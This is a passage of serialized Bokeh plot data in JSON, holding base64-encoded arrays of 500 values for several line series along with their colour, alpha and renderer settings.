YMe/AAAAAAAAob8AAAAAAACovwAAAAAAgLg/AAAAAABAuL8AAAAAAICjPwAAAAAAAGg/AAAAAABgwT8AAAAAANDVvwAAAAAA4MW/AAAAAABAw78AAAAAAACTPwAAAAAAwMq/AAAAAAAAq78AAAAAAECwvwAAAAAAwLU/AAAAAAAAxb8AAAAAAACOvwAAAAAAAJy/AAAAAABAvT8AAAAAAAC8vwAAAAAAAJM/AAAAAAAAhL8AAAAAAMC/PwAAAAAAwMK/AAAAAAAAfL8AAAAAAACcvwAAAAAAwLw/AAAAAABgwb8AAAAAAAB8PwAAAAAAAIy/AAAAAADAvz8AAAAAAADBvwAAAAAAAII/AAAAAAAAhL8AAAAAAMC/PwAAAAAAwLy/AAAAAAAAnT8AAAAAAAB4PwAAAAAAIMI/AAAAAAAA4L8AAAAAAMDbvwAAAAAAkNa/AAAAAAAgwb8AAAAAAADgvwAAAAAAsN2/AAAAAACA2L8AAAAAACDFvwAAAAAAAOC/AAAAAAAA4L8AAAAAANDcvwAAAAAAYMy/AAAAAACA1L8AAAAAAMC9vwAAAAAAwLe/AAAAAABAsj8AAAAAAJDdvwAAAAAA0NK/AAAAAADgzL8AAAAAAACevwAAAAAAwMC/AAAAAACAoz8AAAAAAAChPwAAAAAAgMU/AAAAAABA1r8AAAAAAODGvwAAAAAA4MO/AAAAAAAAkD8AAAAAAEC3vwAAAAAAgK4/AAAAAACAoj8AAAAAAGDEPwAAAAAA8N+/AAAAAACA2b8AAAAAADDVvwAAAAAAgL+/AAAAAADg0L8AAAAAAAC1vwAAAAAAQLW/AAAAAADAsT8AAAAAAIC9vwAAAAAAAJ4/AAAAAAAAcD8AAAAAAODBPwAAAAAAYMG/AAAAAAAAUD8AAAAAAACIvwAAAAAAoMA/AAAAAABAuL8AAAAAAICnPwAAAAAAAJo/AAAAAAAAxD8AAAAAAEC+vwAAAAAAAJM/AAAAAAAAaL8AAAAAAGDBPwAAAAAAwLS/AAAAAAAArT8AAAAAAACePwAAAAAAYMM/AAAAAACAxb8AAAAAAACZvwAAAAAAAKK/AAAAAABAvD8AAAAAAICqvwAAAAAAQLU/AAAAAACApD8AAAAAAGDFPwAAAAAAALK/AAAAAABAsj8AAAAAAICnPw==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[500]}},\"selected\":{\"id\":\"1083\"},\"selection_policy\":{\"id\":\"1082\"}},\"id\":\"1060\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"1074\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"source\":{\"id\":\"1042\"}},\"id\":\"1047\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1075\",\"type\":\"Selection\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#ff7f0e\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1044\",\"type\":\"Line\"},{\"attributes\":{\"line_alpha\":0.2,\"line_color\":\"#2ca02c\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1051\",\"type\":\"Line\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1054\"},\"glyph\":{\"id\":\"1055\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1057\"},\"nonselection_glyph\":{\"id\":\"1056\"},\"view\":{\"id\":\"1059\"}},\"id\":\"1058\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"line_color\":\"#d62728\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1055\",\"type\":\"Line\"},{\"attributes\":{\"line_alpha\":0.2,\"line_color\":\"#d62728\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1057\",\"type\":\"Line\"},{\"attributes\":{\"line_color\":\"#9467bd\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1061\",\"type\":\"Line\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#d62728\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1056\",\"type\":\"Line\"},{\"attributes\":{\"data\":{\"x\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499],\"y\":{\"__ndarray__\":\"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\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[500]}},\"selected\":{\"id\":\"1079\"},\"selection_policy\":{\"id\":\"1078\"}},\"id\":\"1048\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"data\":{\"x\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499],\"y\":{\"__ndarray__\":\"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\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[500]}},\"selected\":{\"id\":\"1081\"},\"selection_policy\":{\"id\":\"1080\"}},\"id\":\"1054\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1060\"},\"glyph\":{\"id\":\"1061\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1063\"},\"nonselection_glyph\":{\"id\":\"1062\"},\"view\":{\"id\":\"1065\"}},\"id\":\"1064\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#9467bd\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1062\",\"type\":\"Line\"},{\"attributes\":{\"line_color\":\"#2ca02c\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1049\",\"type\":\"Line\"},{\"attributes\":{\"line_color\":\"#ff7f0e\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\